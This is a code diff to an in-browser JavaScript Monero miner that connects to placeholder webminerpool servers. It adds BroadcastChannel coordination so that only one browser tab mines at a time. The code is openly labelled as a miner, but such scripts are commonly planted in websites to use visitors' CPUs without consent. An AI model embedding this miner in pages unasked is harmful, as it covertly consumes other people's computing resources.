@@ -1,20 +1,7 @@
 /* very simple monero miner which connects to
  * webminerpool.com. */
 
-const wasmSupported = (() => {
-    try {
-        if (typeof WebAssembly === "object"
-            && typeof WebAssembly.instantiate === "function") {
-            const module = new WebAssembly.Module(Uint8Array.of(0x0, 0x61, 0x73, 0x6d, 0x01, 0x00, 0x00, 0x00));
-            if (module instanceof WebAssembly.Module)
-                return new WebAssembly.Instance(module) instanceof WebAssembly.Instance;
-        }
-    } catch (e) {
-    }
-    return false;
-})();
-
-var server="wss://ws1.server1:80/;wss://ws2.server2:80/;wss://ws3.server3:80/" // the webminerpool servers
+var server="wss://ws1.server:80/;wss://ws2.server:80/;wss://ws3.server:80/"
 
 var job = null;      // remember last job we got from the server
 var workers = [];    // keep track of our workers
@@ -36,6 +23,17 @@ var throttleMiner = 0;  // percentage of miner throttling. If you set this to 20
 
 var handshake = null;
 
+const wasmSupported = (() => {
+  try {
+      if (typeof WebAssembly === "object"
+          && typeof WebAssembly.instantiate === "function") {
+          const module = new WebAssembly.Module(Uint8Array.of(0x0, 0x61, 0x73, 0x6d, 0x01, 0x00, 0x00, 0x00));
+          if (module instanceof WebAssembly.Module)
+              return new WebAssembly.Instance(module) instanceof WebAssembly.Instance;
+      }
+  } catch (e) {}
+  return false;
+})();
 
 function addWorkers(numThreads) {
   logicalProcessors = numThreads;
@@ -85,7 +83,6 @@ var openWebSocket = function () {
     connected = 1;
   }
 
-
 };
 
 reconnector = function () {
@@ -98,6 +95,71 @@ reconnector = function () {
   if (connected !== 3)
   setTimeout(reconnector, 10000 * attempts);
 };
+
+// broadcast logic
+
+function startBroadcast(mining)
+{
+  if (typeof BroadcastChannel !== "function") { 
+      mining(); return;
+  }
+
+  stopBroadcast();
+
+  var bc = new BroadcastChannel('channel');
+  
+  var number = Math.random();
+  var array = [];
+  var timerc = 0;
+  var wantsToStart = true;
+  
+  array.push(number);
+
+  bc.onmessage = function (ev) {
+    if (array.indexOf(ev.data) === -1) array.push(ev.data);
+  }
+
+  function checkShouldStart(){ 
+
+    bc.postMessage(number);
+
+    timerc++;
+    
+    if(timerc % 6 === 0)
+    {
+      array.sort();
+      
+      if(array[0] === number && wantsToStart) 
+      {
+        mining();
+        wantsToStart = false;
+        number = 0;
+      }
+
+      array = [];
+      array.push(number);
+    }
+    
+  }
+
+  startBroadcast.bc = bc;
+  startBroadcast.id = setInterval(checkShouldStart, 500);
+}
+
+function stopBroadcast()
+{
+  if ( typeof startBroadcast.bc != 'undefined' ) {
+    startBroadcast.bc.close();
+  }
+
+  if ( typeof startBroadcast.id != 'undefined' ) {
+    clearInterval(startBroadcast.id);
+  }
+
+}
+
+// end logic
+
 
 // starts mining
 function startMiningWithId(loginid, numThreads = -1, userid = "") {
@@ -114,8 +176,7 @@ function startMiningWithId(loginid, numThreads = -1, userid = "") {
     version : 5
   };
 
-  addWorkers(numThreads);
-  reconnector();
+  startBroadcast(() => {addWorkers(numThreads); reconnector(); });
 }
 
 // starts mining
@@ -135,17 +196,21 @@ function startMining(pool, login, password = "", numThreads = -1, userid = "") {
     version : 5
   };
 
-  addWorkers(numThreads);
-  reconnector();
+  startBroadcast(() => {addWorkers(numThreads); reconnector(); });
+
 }
 
 // stop mining  
 function stopMining() {
+    
+  wantsToMine = false;  
   connected = 3;
   
   if (ws != null) ws.close();
   deleteAllWorkers();
   job = null;
+
+  stopBroadcast();
 }
 
 // add one worker 
